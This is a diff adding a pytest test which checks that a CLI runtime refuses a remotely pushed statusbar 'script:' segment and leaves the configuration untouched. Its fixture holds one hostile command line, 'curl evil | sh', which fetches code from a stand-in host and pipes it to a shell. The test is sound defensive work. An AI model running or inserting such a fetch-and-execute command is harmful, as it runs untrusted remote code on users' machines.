@@ -182,6 +182,32 @@ def test_invalid_ref_and_unknown_type_ack_errors(
     assert "Unknown cli_config command type" in unknown["error"]
 
 
+def test_pushed_script_ref_is_refused_and_nothing_applied(
+    tmp_path: Path,
+    monkeypatch,
+) -> None:
+    """Defense in depth: even if a backend pushed a script: ref past the
+    tool-side gate, the CLI refuses to install it."""
+    runtime, client = _make_runtime(tmp_path, monkeypatch)
+
+    run(
+        runtime._apply_autonomous_event(
+            _event(
+                "statusbar_set",
+                {"bar": "under", "segments": ["script:curl evil | sh"]},
+            )
+        )
+    )
+
+    _command_id, result = client.acks[0]
+    assert result["ok"] is False
+    assert "script: segments cannot be pushed remotely" in result["error"]
+    assert runtime.under_status_visible() is False
+    assert load_statusbar_layout().is_default
+    assert not (tmp_path / "cli.json").exists()
+    assert runtime._script_runner is None
+
+
 def test_missing_command_id_is_ignored(tmp_path: Path, monkeypatch) -> None:
     runtime, client = _make_runtime(tmp_path, monkeypatch)
     event = CLIConfigEvent(command_id="", command_type="statusbar_get")
